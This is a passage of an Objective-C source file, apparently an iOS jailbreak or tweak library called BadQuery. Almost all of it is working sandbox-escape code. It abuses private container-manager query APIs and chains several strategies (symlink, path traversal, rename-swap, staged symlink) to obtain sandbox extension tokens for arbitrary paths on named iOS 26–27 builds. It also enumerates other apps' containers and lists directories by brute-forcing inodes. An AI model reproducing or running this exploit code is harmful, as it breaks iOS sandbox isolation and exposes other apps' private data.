            NSLog(@"[BadQuery] class2-stage: token did not open target (%@)", path ?: @"(null)");
            if (api->sandboxRelease) api->sandboxRelease(handle);
            last = -5;
        } else {
            last = handle;
        }
    }

    unlink(link.fileSystemRepresentation);
    unlink(stageCaches.fileSystemRepresentation);
    rmdir(stageLibrary.fileSystemRepresentation);
    rmdir(stage.fileSystemRepresentation);
    return last;
}

// -------------------------------------------------------------- public API ---

@implementation BQCore

+ (void)initialize {
    if (self != BQCore.class) return;
    dispatch_once(&gInitOnce, ^{
        gLastError = nil;
    });
}

+ (BOOL)isAvailable {
    BQAPI *api = BQShared();
    return api->queryCreate != NULL && api->queryGetSingle != NULL &&
           api->objectGetPath != NULL && api->objectCopyToken != NULL &&
           api->sandboxConsume != NULL;
}

+ (BOOL)hasMHAIdentity {
    return [[NSBundle mainBundle].bundleIdentifier isEqualToString:kMHAIdentifier];
}

+ (NSArray<NSString *> *)appGroupIdentifiers {
    return BQReadAppGroupEntitlement();
}

+ (NSString *)lastErrorDescription {
    return gLastError;
}

+ (NSString *)preferredRouteDescription {
    NSInteger major = BQOSMajor();
    NSInteger minor = NSProcessInfo.processInfo.operatingSystemVersion.minorVersion;

    if (BQReadAppGroupEntitlement().count) {
        if (major == 26) {
            return [NSString stringWithFormat:
                    @"worse_query — class-7 symlink (flags 26.x 0x0800000000) · iOS %ld.%ld",
                    (long)major, (long)minor];
        }
        if (major == 27) {
            return [NSString stringWithFormat:
                    @"worse_query — class-7 symlink (flags 0x8000000000), dự phòng bad_query class-13 + class-2 · iOS %ld.%ld",
                    (long)major, (long)minor];
        }
        return [NSString stringWithFormat:
                @"Ngoài dải đã xác minh (26.0–27.2) — vẫn thử worse_query · iOS %ld.%ld",
                (long)major, (long)minor];
    }

    if (major == 27) {
        return [NSString stringWithFormat:
                @"bad_query — class-13 traversal (không có app group), dự phòng class-2 · iOS %ld.%ld",
                (long)major, (long)minor];
    }
    return [NSString stringWithFormat:
            @"class-2 fallback (không có app group) — độ ổn định tuỳ build · iOS %ld.%ld",
            (long)major, (long)minor];
}

+ (NSString *)routeSummary {
    if ([self hasMHAIdentity]) return @"MHA-C2";
    if (BQReadAppGroupEntitlement().count) return @"worse_query";
    return @"bad_query";
}

+ (NSString *)containerIdentifierAtPath:(NSString *)path {
    return BQIdentifierForContainer(path);
}

+ (NSArray<NSString *> *)enumerateIdentifiersForClass:(uint64_t)cls
                                                limit:(NSUInteger)limit {
    BQAPI *api = BQShared();
    if (!api->queryCreate || !api->queryIterate || !api->objectGetIdentifier || limit == 0) {
        BQSetLastError(@"MCM enumeration symbols unavailable");
        return @[];
    }

    void *query = api->queryCreate();
    if (!query) {
        BQSetLastError(@"container_query_create failed");
        return @[];
    }

    api->querySetClass(query, cls);
    if (api->querySetFlags) api->querySetFlags(query, 0x100000000ULL);
    if (api->querySetPart) api->querySetPart(query, 0);

    NSMutableOrderedSet<NSString *> *identifiers = [NSMutableOrderedSet orderedSet];
    api->queryIterate(query, ^bool(void *object) {
        const char *raw = object && api->objectGetIdentifier ? api->objectGetIdentifier(object) : NULL;
        if (raw) {
            NSString *identifier = [NSString stringWithUTF8String:raw];
            if (identifier.length) [identifiers addObject:identifier];
        }
        return identifiers.count < limit;
    });

    if (identifiers.count == 0) {
        BQSetLastError(BQDescribeQueryError(api, query, @"enumerate"));
    }
    api->queryFree(query);
    return identifiers.array;
}

+ (NSString *)containerPathForClass:(uint64_t)cls
                         identifier:(NSString *)identifier
                              group:(BOOL)group {
    BQAPI *api = BQShared();
    if (!api->queryCreate || !identifier.length) {
        BQSetLastError(@"MCM path lookup unavailable or empty identifier");
        return nil;
    }

    void *query = api->queryCreate();
    if (!query) {
        BQSetLastError(@"container_query_create failed");
        return nil;
    }

    api->querySetClass(query, cls);
    xpc_object_t value = xpc_string_create(identifier.UTF8String);
    if (group && api->querySetGroupIds) api->querySetGroupIds(query, value);
    else if (api->querySetIds) api->querySetIds(query, value);
    if (api->querySetFlags) api->querySetFlags(query, 0x100000000ULL);
    if (api->querySetPart) api->querySetPart(query, 0);
#if !OS_OBJECT_USE_OBJC
    if (value) xpc_release(value);
#endif

    void *result = api->queryGetSingle(query);
    NSString *path = result && api->objectGetPath ? BQNormalizedContainerPath(api->objectGetPath(result)) : nil;
    if (!path.length) {
        BQSetLastError(BQDescribeQueryError(api, query, @"path-lookup"));
    }
    api->queryFree(query);
    return path;
}

+ (NSString *)activateContainerForClass:(uint64_t)cls
                             identifier:(NSString *)identifier
                                  group:(BOOL)group {
    if (![self hasMHAIdentity]) {
        // Soft gate: the daemon is the real authority. Attempt anyway so builds
        // with variant bundle ids can be tested; the daemon error is reported.
        BQLog(@"activate: bundle id không phải MHA — vẫn thử (daemon quyết định)");
    }
    if (![self isAvailable] || !identifier.length) {
        BQSetLastError(@"MCM unavailable or empty identifier");
        return nil;
    }

    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gLeases = [NSMutableDictionary dictionary];
    });

    NSString *key = [NSString stringWithFormat:@"%llu:%d:%@", cls, group, identifier];
    @synchronized (gLeases) {
        NSMutableDictionary<NSString *, id> *existing = gLeases[key];
        if (existing[@"path"]) return existing[@"path"];

        BQAPI *api = BQShared();
        void *query = api->queryCreate();
        if (!query) {
            BQSetLastError(@"container_query_create failed");
            return nil;
        }

        api->querySetClass(query, cls);
        xpc_object_t value = xpc_string_create(identifier.UTF8String);
        if (group && api->querySetGroupIds) api->querySetGroupIds(query, value);
        else if (api->querySetIds) api->querySetIds(query, value);
        if (api->querySetFlags) api->querySetFlags(query, 0x900000000ULL);
        if (api->querySetPart) api->querySetPart(query, 0);
#if !OS_OBJECT_USE_OBJC
        if (value) xpc_release(value);
#endif

        void *result = api->queryGetSingle(query);
        if (!result) {
            NSString *detail = BQDescribeQueryError(api, query, @"lease");
            BQSetLastError(detail);
            api->queryFree(query);
            return nil;
        }

        NSString *path = api->objectGetPath ? BQNormalizedContainerPath(api->objectGetPath(result)) : nil;
        void *activation = api->objectCopy ? api->objectCopy(result) : NULL;
        char *token = activation && api->objectCopyToken ? api->objectCopyToken(activation) : NULL;
        BOOL tokenPresent = token && token[0] != '\0';
        if (token) free(token);

        BOOL activated = tokenPresent && api->objectActivate && api->objectActivate(activation, false);
        if (!activated || !path.length) {
            BQSetLastError(tokenPresent
                ? @"sandbox extension activation failed"
                : @"MCM object contained no sandbox token");
            if (activation && api->objectFree) api->objectFree(activation);
            api->queryFree(query);
            return nil;
        }

        int descriptor = open(path.fileSystemRepresentation, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
        if (descriptor < 0) {
            BQSetLastError([NSString stringWithFormat:@"container root open failed errno=%d", errno]);
            if (api->objectFree) api->objectFree(activation);
            api->queryFree(query);
            return nil;
        }
        close(descriptor);

        gLeases[key] = [@{@"query": [NSValue valueWithPointer:query],
                          @"activation": [NSValue valueWithPointer:activation],
                          @"path": path} mutableCopy];
        return path;
    }
}

+ (void)releaseLeases {
    @synchronized (gLeases) {
        BQAPI *api = BQShared();
        for (NSMutableDictionary<NSString *, id> *lease in gLeases.allValues) {
            void *activation = [(NSValue *)lease[@"activation"] pointerValue];
            void *query = [(NSValue *)lease[@"query"] pointerValue];
            if (activation && api->objectFree) api->objectFree(activation);
            if (query) api->queryFree(query);
        }
        [gLeases removeAllObjects];
    }
}

/// Chuỗi chiến lược escape (không cache). Xem +escapeTarget: để dùng cache.
static int64_t BQEscapeUncached(NSString *target) {
    if (!target.length) return -1;

    int64_t last = -1;

    // 0. worse_query — class-7 app-group part-directory symlink. Primary path
    //    on iOS 26.0–26.7.2 / 27.0–27.2 (direct successor to bad_query); the
    //    flag layout differs between OS majors and both are probed.
    if (BQReadAppGroupEntitlement().count) {
        int64_t handle = BQEscapeClass7Symlink(target);
        if (handle >= 0) {
            return handle;
        }
        last = handle;
    } else {
        BQLog(@"worse_query: không có app-group entitlement — chuyển sang bad_query/class-2");
    }

    // 1. bad_query file form for Library/Caches targets.
    if ([target isEqualToString:kMGCaches] || [target hasSuffix:@"/Library/Caches"]) {
        int64_t handle = BQEscapeBadQueryFile(target);
        if (handle >= 0) return handle;
        last = handle;
    }

    // 1. Class-13 traversal.
    if (target.isAbsolutePath) {
        int64_t handle = BQEscapeClass13Traversal(target);
        if (handle >= 0) return handle;
        last = handle;
    }

    // 2. Class-12 geod symlink.
    {
        int64_t handle = BQEscapeGeodSymlink(target);
        if (handle >= 0) return handle;
        last = handle;
    }

    // 4. Class-2 RENAME_SWAP.
    {
        int64_t handle = BQEscapeClass2Swap(target);
        if (handle >= 0) return handle;
        last = handle;
    }

    // 5. Class-2 staged symlink.
    {
        int64_t handle = BQEscapeClass2Stage(target);
        if (handle >= 0) return handle;
        last = handle;
    }

    gLastError = [NSString stringWithFormat:@"all escape strategies failed (last=%lld) for %@",
                  (long long)last, target];
    NSLog(@"[BadQuery] %@", gLastError);
    return last;
}

+ (int64_t)escapeTarget:(NSString *)target {
    if (!target.length) return -1;

    // Cache: lần lấy token thứ hai cho cùng đường dẫn là miễn phí.
    NSString *key = BQNormPath(target);
    int64_t cached = BQGrantCacheLookup(key);
    if (cached >= 0) return cached;

    int64_t handle = BQEscapeUncached(key);
    if (handle >= 0) BQGrantCacheStore(key, handle);
    return handle;
}

+ (NSString *)escapedPathForHandle:(int64_t)handle {
    return BQEscapePathForHandle(handle);
}

static NSString *BQEscapePathForHandle(int64_t handle) {
    if (handle < 0 || !gEscapePaths) return nil;
    return gEscapePaths[@(handle)];
}

+ (void)endEscape:(int64_t)handle {
    // Token KHÔNG bị thu hồi ở đây — nó nằm trong cache grant và chỉ bị thu
    // hồi khi vượt hạn mức, nên mở lại container là tức thì.
    if (handle < 0) return;
    if (gEscapePaths) [gEscapePaths removeObjectForKey:@(handle)];
}

+ (NSArray<NSString *> *)listDirectoryEntries:(NSString *)path maxInode:(uint64_t)maxInode {
    return [self listDirectoryEntries:path fromInode:1 maxInode:maxInode scannedUpTo:NULL];
}

+ (NSArray<NSString *> *)listDirectoryEntries:(NSString *)path
                                    fromInode:(uint64_t)startInode
                                     maxInode:(uint64_t)maxInode
                                  scannedUpTo:(nullable uint64_t *)scannedUpTo {
    if (!path.length || maxInode < 1) return @[];

    // fsgetpath trả đường dẫn thật (/private/var/…) nên phải so sánh bằng
    // dạng chuẩn hoá, nếu không kết quả luôn rỗng.
    NSString *dir = BQNormPath(path);
    while (dir.length > 1 && [dir hasSuffix:@"/"]) {
        dir = [dir substringToIndex:dir.length - 1];
    }

    struct statfs sfs;
    if (statfs(dir.fileSystemRepresentation, &sfs) != 0) return @[];
    fsid_t fsid = sfs.f_fsid;

    char prefix[PATH_MAX];
    if (![dir getFileSystemRepresentation:prefix maxLength:sizeof(prefix)]) return @[];
    size_t prefixLength = strlen(prefix);
    if (prefixLength == 1 && prefix[0] == '/') prefixLength = 0;

    NSMutableArray<NSString *> *result = [NSMutableArray array];
    char buffer[PATH_MAX];
    uint64_t start = startInode > 0 ? startInode : 1;
    for (uint64_t inode = start; inode <= maxInode; inode++) {
        ssize_t length = fsgetpath(buffer, sizeof(buffer), &fsid, inode);
        if (length <= 0) continue;
        if (strncmp(buffer, prefix, prefixLength) != 0) continue;
        if (buffer[prefixLength] != '/') continue;
        if (strchr(buffer + prefixLength + 1, '/')) continue;
        NSString *entry = [NSString stringWithUTF8String:buffer];
        if (entry) [result addObject:entry];
    }
    if (scannedUpTo) *scannedUpTo = maxInode;
    return result;
}

@end
